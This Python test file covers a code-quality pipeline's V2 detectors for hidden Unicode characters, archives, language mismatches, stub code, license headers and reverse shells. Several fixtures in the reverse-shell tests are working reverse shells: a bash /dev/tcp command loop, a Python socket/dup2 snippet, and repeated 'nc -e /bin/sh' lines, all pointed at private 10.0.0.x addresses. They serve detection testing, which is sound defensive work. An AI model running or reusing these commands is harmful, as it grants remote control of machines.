"""Tests for the V2 repository code quality pipeline and its ported rule groups.

V1 stays covered by ``test_repository_code_quality_pipeline.py``; these tests pin the
V2-only behaviour (contextual characters, artifacts, language consistency, placeholder
implementations, license and reverse-shell candidate-then-confirm) plus the guarantee
that V1 does not pick any of it up.
"""

from dingo.io.input import Data
from dingo.io.output.eval_detail import EvalDetail
from dingo.model.llm.code_quality.base_code_quality import execution_error
from dingo.model.llm.repository_code_quality import LLMRepositoryCodeQualityPipeline, LLMRepositoryCodeQualityPipelineV2
from dingo.model.llm.repository_code_quality.common import rules_input_content as input_content_rules
from dingo.model.llm.repository_code_quality.common.llm_repository_license_review import LLMRepositoryLicenseReview
from dingo.model.llm.repository_code_quality.common.llm_repository_malware_review import LLMRepositoryReverseShellReview
from dingo.model.llm.repository_code_quality.common.rules_artifact import artifact_findings
from dingo.model.llm.repository_code_quality.common.rules_input_content import contextual_character_findings, input_content_findings, input_content_review_findings
from dingo.model.llm.repository_code_quality.common.rules_language_consistency import language_consistency_findings, language_consistency_review_findings
from dingo.model.llm.repository_code_quality.common.rules_license import license_candidates, license_findings, license_review_findings
from dingo.model.llm.repository_code_quality.common.rules_malware import reverse_shell_candidates, reverse_shell_rule_findings
from dingo.model.llm.repository_code_quality.common.rules_placeholder_implementation import placeholder_implementation_findings, placeholder_implementation_review_findings


def repository_data(content, **kwargs):
    values = {
        "track_id": "test-record",
        "source": "unit-test",
        "content": content,
        "language": "python",
    }
    values.update(kwargs)
    return Data(**values)


def test_contextual_character_anomaly_flags_format_private_and_unassigned():
    zwsp = contextual_character_findings(
        Data(content="value = 'a\u200bb'  # zero width\n", language="python", file_name="main.py")
    )
    reason = next(
        item["reason"] for item in zwsp
        if item["label"] == "Effectiveness.Contextual_Character_Anomaly"
    )
    assert "format=1" in reason

    private = contextual_character_findings(
        Data(content="label = 'x\ue000y'  # private use\n", language="python", file_name="main.py")
    )
    reason = next(
        item["reason"] for item in private
        if item["label"] == "Effectiveness.Contextual_Character_Anomaly"
    )
    assert "private_use_non_comment=1" in reason

    if input_content_rules._CURRENT_UNICODE_ASSIGNMENT_AVAILABLE:
        unassigned = contextual_character_findings(
            Data(content="text = 'a\u0378b'  # unassigned\n", language="python", file_name="main.py")
        )
        reason = next(
            item["reason"] for item in unassigned
            if item["label"] == "Effectiveness.Contextual_Character_Anomaly"
        )
        assert "unassigned=1" in reason


def test_contextual_character_exemptions_avoid_false_positives():
    bom = contextual_character_findings(Data(content="\ufeffpackage main\n", language="go", file_name="main.go"))
    assert "Effectiveness.Contextual_Character_Anomaly" not in {item["label"] for item in bom}

    soft_hyphen = contextual_character_findings(
        Data(content="Konfi\u00adguration und CO\u00adAngaben\n", language="markdown", file_name="README.md")
    )
    assert soft_hyphen == []

    emoji_zwj = contextual_character_findings(
        Data(content="family = '\U0001F468\u200d\U0001F466'  # emoji zwj\n", language="python", file_name="main.py")
    )
    assert "Effectiveness.Contextual_Character_Anomaly" not in {item["label"] for item in emoji_zwj}

    icon_font = contextual_character_findings(
        Data(content="# icon glyph map\nglyph = '\ue0a0'\n", language="python", file_name="icons/powerline.py")
    )
    assert "Effectiveness.Contextual_Character_Anomaly" not in {item["label"] for item in icon_font}

    abap_comment = contextual_character_findings(
        Data(content="* comment \ue000\nWRITE 1.\n", language="abap", file_name="report.abap")
    )
    assert "Effectiveness.Contextual_Character_Anomaly" not in {item["label"] for item in abap_comment}


def test_contextual_format_character_review_is_reported_without_hard_gate():
    data = Data(
        content="// summary with zero\u200bwidth marker\nint main() { return 0; }\n",
        language="cpp",
        file_name="main.cpp",
    )
    assert input_content_findings(data) == []
    review = input_content_review_findings(data)
    assert [item["label"] for item in review] == ["Effectiveness.Contextual_Format_Character_Review"]
    assert "count=1" in review[0]["reason"]


def test_pipeline_surfaces_contextual_review_finding_without_hard_gate(monkeypatch):
    def fake_stage(cls, evaluator, input_data, config):
        return EvalDetail(metric=evaluator.__name__, status=False, label=["QUALITY_GOOD"], reason=["reviewed"])

    monkeypatch.setattr(LLMRepositoryCodeQualityPipelineV2, "_run_stage", classmethod(fake_stage))
    data = repository_data(
        "// summary with zero\u200bwidth marker\nint main() { return 0; }\n",
        language="cpp",
        file_name="main.cpp",
    )
    result = LLMRepositoryCodeQualityPipelineV2.eval(data)
    assert result.applicable
    assert result.label == ["Effectiveness.Contextual_Format_Character_Review"]
    assert result.score == 0


APACHE_HEADER = (
    "/*\n"
    " * Copyright (C) 2014 The Android Open Source Project\n"
    " *\n"
    " * Licensed under the Apache License, Version 2.0 (the \"License\");\n"
    " * you may not use this file except in compliance with the License.\n"
    " * You may obtain a copy of the License at\n"
    " *\n"
    " *      http://www.apache.org/licenses/LICENSE-2.0\n"
    " */\n"
)


def test_language_consistency_flags_confirmed_mismatch_only():
    java = "package com.example;\n\nimport java.util.List;\n\npublic class Foo {\n}\n"
    mismatch = language_consistency_findings(repository_data(java, language="python", file_name="Foo.java"))
    assert [item["label"] for item in mismatch] == ["Effectiveness.Language_Content_Mismatch"]
    assert language_consistency_findings(repository_data(java, language="java", file_name="Foo.java")) == []
    review = language_consistency_review_findings(repository_data("prose only\n", language="python", file_name="notes.md"))
    assert [item["label"] for item in review] == ["Effectiveness.Language_Mismatch_Review"]

    sql = "SELECT a, b FROM t WHERE c = 1;\nCREATE TABLE x (id INT);\n"
    assert language_consistency_findings(repository_data(sql, language="TSQL", file_name="q.sql")) == []
    assert language_consistency_review_findings(repository_data(sql, language="TSQL", file_name="q.sql")) == []


def test_archive_and_rcs_artifacts_are_flagged():
    assert artifact_findings(repository_data("not code\n", file_name="libs/vendor.zip"))
    rcs = "head\t1.3;\naccess;\nsymbols;\ncomment\t@# @;\n"
    assert artifact_findings(repository_data(rcs, file_name="src/main.c,v"))
    assert artifact_findings(repository_data(rcs))
    assert artifact_findings(repository_data("int main() { return 0; }\n", file_name="main.c")) == []


def test_placeholder_implementations_split_todo_and_not_implemented():
    java = (
        "public class Stub {\n"
        "    public void run() {\n"
        "        // TODO Auto-generated method stub\n"
        "    }\n"
        "}\n"
    )
    todo = placeholder_implementation_findings(repository_data(java, file_name="Stub.java"))
    assert [item["label"] for item in todo] == ["Effectiveness.Todo_Empty_Implementation"]

    python = "class Worker:\n    def process(self, item):\n        raise NotImplementedError\n"
    not_implemented = placeholder_implementation_findings(repository_data(python, file_name="worker.py"))
    assert [item["label"] for item in not_implemented] == ["Effectiveness.NotImplemented_Placeholder"]

    abstract = "class BaseWorker:\n    def process(self, item):\n        raise NotImplementedError\n"
    assert placeholder_implementation_findings(repository_data(abstract, file_name="worker.py")) == []
    assert placeholder_implementation_review_findings(repository_data(abstract, file_name="worker.py"))


def test_reverse_shell_combinations_match_yara_condition():
    bash = "#!/bin/sh\nexec 5<>/dev/tcp/10.0.0.1/4444\ncat <&5 | while read c; do $c; done\n"
    candidates = reverse_shell_candidates(repository_data(bash))
    assert len(candidates) == 1
    assert candidates[0]["indicators"] == ["/dev/tcp/", "/bin/sh"]
    assert candidates[0]["anchor_line"] == 2
    assert "/dev/tcp/10.0.0.1" in candidates[0]["excerpt"]
    assert [item["label"] for item in reverse_shell_rule_findings(candidates)] == ["Security.Reverse_Shell"]
    python = (
        "import os, socket, subprocess\n"
        "s = socket.socket()\n"
        "s.connect((host, port))\n"
        "os.dup2(s.fileno(), 0)\n"
        "subprocess.call(['sh'])\n"
    )
    assert reverse_shell_candidates(repository_data(python))
    assert reverse_shell_candidates(repository_data("print('hello /dev/tcp/ world')\n")) == []
    assert reverse_shell_rule_findings([]) == []


def test_reverse_shell_candidates_are_bounded():
    noisy = "".join(f"nc -e /bin/sh 10.0.0.{index} 4444\n" for index in range(40))
    candidates = reverse_shell_candidates(repository_data(noisy))
    assert len(candidates) <= 6
    assert all(len(candidate["excerpt"]) <= 1600 for candidate in candidates)
    windows = [(candidate["line_start"], candidate["line_end"]) for candidate in candidates]
    assert len(set(windows)) == len(windows)


def test_license_families_are_cleaning_targets():
    apache = license_findings(repository_data(APACHE_HEADER + "package x;\n", file_name="A.java"))
    assert [item["label"] for item in apache] == ["Security.License_Header"]
    assert "APACHE_2_0" in apache[0]["reason"]
    assert "lines 1-9" in apache[0]["reason"]

    mit = (
        "// Permission is hereby granted, free of charge, to any person obtaining a copy\n"
        "// of this software, to deal in the Software without restriction.\n"
    )
    assert "MIT" in license_findings(repository_data(mit, file_name="m.py"))[0]["reason"]

    spdx = license_findings(repository_data("/* SPDX-License-Identifier: MPL-2.0 */\nint x;\n", file_name="a.c"))
    assert "SPDX_IDENTIFIER" in spdx[0]["reason"]

    go_bsd = license_findings(repository_data(
        "// Use of this source code is governed by a BSD-style license that can be\n"
        "// found in the LICENSE file.\npackage main\n", file_name="main.go"))
    assert "BSD_GO_STYLE" in go_bsd[0]["reason"]

    rust_dual = license_findings(repository_data(
        "// Licensed under either of Apache License, Version 2.0 or MIT license at your option.\n",
        file_name="lib.rs"))
    assert "RUST_DUAL" in rust_dual[0]["reason"]

    cc = license_findings(repository_data(
        "# This work is licensed under a Creative Commons Attribution 4.0 International License.\n",
        file_name="doc.md"))
    assert "CREATIVE_COMMONS" in cc[0]["reason"]


def test_license_block_span_covers_every_comment_style():
    matlab = (
        "% permutationTest(sample1, sample2)\n"
        "%\n"
        "% 2015-11-26 First version\n"
        "%\n"
        "% This program is free software: you can redistribute it and/or modify\n"
        "% it under the terms of the GNU General Public License as published by\n"
        "% the Free Software Foundation, either version 3 of the License.\n"
        "x = 1;\n"
    )
    candidate = license_candidates(repository_data(matlab, language="matlab", file_name="t.m"))[0]
    assert candidate["families"] == ["GPL"]
    # The unrelated docstring above stays out of the cleaning span; only the
    # separator comment line and the license text itself are absorbed.
    assert (candidate["line_start"], candidate["line_end"]) == (4, 7)

    php = (
        "<?php\n"
        "/*\n"
        "Dragon Go Server\n"
        "Copyright (C) 2001 Erik Ouchterlony\n"
        "\n"
        "This program is free software: you can redistribute it and/or modify\n"
        "it under the terms of the GNU Affero General Public License as\n"
        "published by the Free Software Foundation, either version 3 of the License.\n"
        "*/\n"
        "function f() {}\n"
    )
    candidate = license_candidates(repository_data(php, language="php", file_name="m.php"))[0]
    assert (candidate["line_start"], candidate["line_end"]) == (2, 9)

    lua = (
        "--[[\n"
        "Copyright (C) 2008 Byron James Johnson\n"
        "\n"
        "Tankbobs is free software: you can redistribute it and/or modify\n"
        "it under the terms of the GNU General Public License as published by\n"
        "the Free Software Foundation, either version 3 of the License.\n"
        "]]\n"
        "local x = 1\n"
    )
    candidate = license_candidates(repository_data(lua, language="lua", file_name="w.lua"))[0]
    assert (candidate["line_start"], candidate["line_end"]) == (1, 7)

    ruby = (
        "=begin\n"
        "Copyright (C) 2013 Carl P. Corliss\n"
        "\n"
        "This program is free software; you can redistribute it and/or modify\n"
        "it under the terms of the GNU General Public License as published by\n"
        "the Free Software Foundation; either version 2 of the License.\n"
        "=end\n"
        "puts 1\n"
    )
    candidate = license_candidates(repository_data(ruby, language="ruby", file_name="p.rb"))[0]
    assert (candidate["line_start"], candidate["line_end"]) == (1, 7)
    assert "GNU General Public License" in candidate["excerpt"]


def test_license_document_candidates_cover_the_whole_file():
    body = (
        "MIT License\n"
        "\n"
        "Copyright (c) 2020 Example\n"
        "\n"
        "Permission is hereby granted, free of charge, to any person obtaining a copy\n"
        "of this software, to deal in the Software without restriction.\n"
    )
    candidate = license_candidates(repository_data(body, language="text", file_name="LICENSE"))[0]
    assert candidate["license_document"] is True
    assert (candidate["line_start"], candidate["line_end"]) == (1, 6)
    assert candidate["families"] == ["MIT"]

    unrecognised = repository_data("Project licence terms.\n", language="text", file_meta={"file_path": "repo/COPYING.txt"})
    candidate = license_candidates(unrecognised)[0]
    assert candidate["families"] == ["LICENSE_FILE"]
    assert license_review_findings(unrecognised) == []


def test_non_license_shapes_stay_silent_or_go_to_review():
    copyright_only = repository_data(
        "/* Copyright (C) 2014 The Android Open Source Project. All rights reserved. */\npackage x;\n",
        file_name="A.java",
    )
    assert license_findings(copyright_only) == []
    assert license_review_findings(copyright_only) == []

    restrictive = repository_data(
        "/* Confidential. No license is granted. May not be copied. */\npackage x;\n",
        file_name="A.java",
    )
    assert license_findings(restrictive) == []
    assert license_review_findings(restrictive) == []

    reference = repository_data("// See the LICENSE file for details.\npackage x;\n", file_name="A.java")
    assert license_findings(reference) == []
    assert [item["label"] for item in license_review_findings(reference)] == ["Security.License_Reference_Review"]

    tag = repository_data("# license: MIT\nprint(1)\n", file_name="m.py")
    assert [item["label"] for item in license_review_findings(tag)] == ["Security.License_Reference_Review"]

    trap = repository_data(
        "class LicenseManager:\n    def validate_license(self, plate):\n        return bool(plate)\n",
        file_name="license_manager.py",
    )
    assert license_findings(trap) == []
    assert license_review_findings(trap) == []


def test_license_url_tag_is_review_not_cleaning_target():
    tag = repository_data(
        '{\n  "name": "place",\n  "license": "http://creativecommons.org/licenses/by-sa/4.0/"\n}\n',
        file_name="148044.json",
    )
    assert license_findings(tag) == []
    assert [item["label"] for item in license_review_findings(tag)] == ["Security.License_Reference_Review"]


def test_language_adjustments_silence_dialect_and_suffix_collisions():
    sql = "SELECT a, b FROM t WHERE c = 1;\nCREATE TABLE x (id INT);\n"
    assert language_consistency_findings(repository_data(sql, language="PLpgSQL", file_name="m.sql")) == []
    assert language_consistency_review_findings(repository_data(sql, language="PLpgSQL", file_name="m.sql")) == []

    cmake = "cmake_minimum_required(VERSION 3.17)\nproject(foo LANGUAGES CXX)\n"
    assert language_consistency_review_findings(repository_data(cmake, language="CMake", file_name="CMakeLists.txt")) == []

    jsx_only = "function openNav() {\n  return 1;\n}\nconst menu = 2;\n"
    assert language_consistency_review_findings(repository_data(jsx_only, language="JavaScript", file_name="nav.js")) == []
    assert language_consistency_review_findings(repository_data(jsx_only, language="TSX", file_name="nav.tsx")) == []


REVERSE_SHELL_SCRIPT = (
    "#!/bin/sh\n"
    "exec 5<>/dev/tcp/10.0.0.1/4444\n"
    "cat <&5 | while read -r command; do $command >&5 2>&1; done\n"
)


def reviewed(evaluator):
    return EvalDetail(metric=evaluator.__name__, status=False, score=1, label=["QUALITY_GOOD"], reason=["reviewed"])


def test_pipeline_surfaces_new_deterministic_labels(monkeypatch):
    def fake_stage(cls, evaluator, input_data, config):
        if evaluator is LLMRepositoryLicenseReview:
            return EvalDetail(
                metric=evaluator.__name__, status=True, score=0,
                label=["Security.License_Header"], reason=["Apache boilerplate header"],
            )
        return reviewed(evaluator)

    monkeypatch.setattr(LLMRepositoryCodeQualityPipelineV2, "_run_stage", classmethod(fake_stage))
    data = repository_data(APACHE_HEADER + "package x;\n", language="java", file_name="A.java")
    result = LLMRepositoryCodeQualityPipelineV2.eval(data)
    assert "Security.License_Header" in result.label


def test_pipeline_confirms_license_and_reverse_shell_candidates(monkeypatch):
    seen = {}

    def fake_stage(cls, evaluator, input_data, config):
        if evaluator is LLMRepositoryLicenseReview:
            seen["license"] = getattr(input_data, "repository_license_candidates")
            return EvalDetail(
                metric=evaluator.__name__, status=True, score=0,
                label=["Security.License_Header"], reason=["Apache boilerplate header"],
            )
        if evaluator is LLMRepositoryReverseShellReview:
            seen["reverse_shell"] = getattr(input_data, "repository_reverse_shell_candidates")
            return EvalDetail(
                metric=evaluator.__name__, status=True, score=0,
                label=["Security.Reverse_Shell"], reason=["shell bound to a remote socket"],
            )
        return reviewed(evaluator)

    monkeypatch.setattr(LLMRepositoryCodeQualityPipelineV2, "_run_stage", classmethod(fake_stage))
    data = repository_data(APACHE_HEADER + REVERSE_SHELL_SCRIPT, language="sh", file_name="run.sh")
    result = LLMRepositoryCodeQualityPipelineV2.eval(data)
    assert seen["license"][0]["families"] == ["APACHE_2_0"]
    assert seen["reverse_shell"][0]["indicators"] == ["/dev/tcp/", "/bin/sh"]
    assert "Security.License_Header" in result.label
    assert "Security.Reverse_Shell" in result.label
    license_reason = result.reason[result.label.index("Security.License_Header")]
    assert "Apache boilerplate header" in license_reason
    assert "spans lines 1-9" in license_reason


def test_pipeline_drops_candidates_the_model_rejects(monkeypatch):
    def fake_stage(cls, evaluator, input_data, config):
        if evaluator is LLMRepositoryLicenseReview:
            return EvalDetail(
                metric=evaluator.__name__, status=True, score=0,
                label=["Security.License_Reference_Review"],
                reason=["License wording is not a strippable header block: CVRF legal note."],
            )
        return reviewed(evaluator)

    monkeypatch.setattr(LLMRepositoryCodeQualityPipelineV2, "_run_stage", classmethod(fake_stage))
    payload = (
        '{\n'
        '  "text": "The CVRF data is provided under the Creative Commons License 4.0 (CC-BY-4.0).",\n'
        '  "title": "Terms of Use"\n'
        '}\n'
    )
    data = repository_data(payload, language="json", file_name="CVE-2013-6406.json")
    assert license_candidates(data)
    result = LLMRepositoryCodeQualityPipelineV2.eval(data)
    assert "Security.License_Header" not in result.label
    assert "Security.License_Reference_Review" in result.label

    shell_data = repository_data(REVERSE_SHELL_SCRIPT, language="sh", file_name="test_helper.sh")
    shell_result = LLMRepositoryCodeQualityPipelineV2.eval(shell_data)
    assert "Security.Reverse_Shell" not in shell_result.label


def test_pipeline_keeps_rule_verdict_when_confirmation_stage_fails(monkeypatch):
    def fake_stage(cls, evaluator, input_data, config):
        if evaluator in (LLMRepositoryLicenseReview, LLMRepositoryReverseShellReview):
            return execution_error(evaluator.__name__, "ConvertJsonError")
        return reviewed(evaluator)

    monkeypatch.setattr(LLMRepositoryCodeQualityPipelineV2, "_run_stage", classmethod(fake_stage))
    data = repository_data(APACHE_HEADER + REVERSE_SHELL_SCRIPT, language="sh", file_name="run.sh")
    result = LLMRepositoryCodeQualityPipelineV2.eval(data)
    assert "Security.License_Header" in result.label
    assert "Security.Reverse_Shell" in result.label
    assert "REVIEW_EXECUTION_ERROR.license" in result.label
    assert "REVIEW_EXECUTION_ERROR.reverse_shell" in result.label
    assert result.applicable is False


V2_ONLY_LABELS = {
    "Effectiveness.Contextual_Character_Anomaly",
    "Effectiveness.Contextual_Format_Character_Review",
    "Effectiveness.Archive_Artifact",
    "Effectiveness.Language_Content_Mismatch",
    "Effectiveness.Language_Mismatch_Review",
    "Effectiveness.Todo_Empty_Implementation",
    "Effectiveness.NotImplemented_Placeholder",
    "Effectiveness.Placeholder_Implementation_Review",
    "Security.License_Header",
    "Security.License_Reference_Review",
    "Security.Reverse_Shell",
    "Security.ClamAV_Detection",
}


def test_v1_stays_on_its_frozen_checks():
    """V1 is a version snapshot: the ported checks must not leak into it."""
    zero_width = repository_data(
        "value = 'a\u200bb'  # zero width\nprint('hello world')\n", language="python", file_name="main.py"
    )
    assert contextual_character_findings(zero_width)
    assert input_content_findings(zero_width) == []

    apache = repository_data(APACHE_HEADER + "package x;\n", language="java", file_name="A.java")
    assert license_findings(apache)
    assert LLMRepositoryCodeQualityPipeline.eval.__func__ is not LLMRepositoryCodeQualityPipelineV2.eval.__func__


def test_v1_pipeline_emits_no_v2_labels(monkeypatch):
    called = []

    def fake_stage(cls, evaluator, input_data, config):
        called.append(evaluator.__name__)
        return reviewed(evaluator)

    monkeypatch.setattr(LLMRepositoryCodeQualityPipeline, "_run_stage", classmethod(fake_stage))
    data = repository_data(APACHE_HEADER + REVERSE_SHELL_SCRIPT, language="sh", file_name="run.sh")
    result = LLMRepositoryCodeQualityPipeline.eval(data)
    assert called == [
        "LLMTextAdvertisement", "LLMRepositorySecurityProhibition", "LLMRepositorySecurityPolitics",
    ]
    assert not V2_ONLY_LABELS & set(result.label)
    assert result.applicable


def test_v2_pipeline_flags_what_v1_ignores(monkeypatch):
    def fake_stage(cls, evaluator, input_data, config):
        if evaluator is LLMRepositoryLicenseReview:
            return EvalDetail(
                metric=evaluator.__name__, status=True, score=0,
                label=["Security.License_Header"], reason=["Apache boilerplate header"],
            )
        if evaluator is LLMRepositoryReverseShellReview:
            return EvalDetail(
                metric=evaluator.__name__, status=True, score=0,
                label=["Security.Reverse_Shell"], reason=["shell bound to a remote socket"],
            )
        return reviewed(evaluator)

    monkeypatch.setattr(LLMRepositoryCodeQualityPipelineV2, "_run_stage", classmethod(fake_stage))
    data = repository_data(APACHE_HEADER + REVERSE_SHELL_SCRIPT, language="sh", file_name="run.sh")
    result = LLMRepositoryCodeQualityPipelineV2.eval(data)
    assert result.metric == "LLMRepositoryCodeQualityPipelineV2"
    assert {"Security.License_Header", "Security.Reverse_Shell"} <= set(result.label)


def test_v2_hard_gates_contextual_characters_before_any_stage(monkeypatch):
    called = []

    def fake_stage(cls, evaluator, input_data, config):
        called.append(evaluator.__name__)
        return reviewed(evaluator)

    monkeypatch.setattr(LLMRepositoryCodeQualityPipelineV2, "_run_stage", classmethod(fake_stage))
    data = repository_data(
        "value = 'a\u200bb'  # zero width\nprint('hello world')\n", language="python", file_name="main.py"
    )
    result = LLMRepositoryCodeQualityPipelineV2.eval(data)
    assert called == []
    assert result.label == ["Effectiveness.Contextual_Character_Anomaly"]
    assert result.score == 0
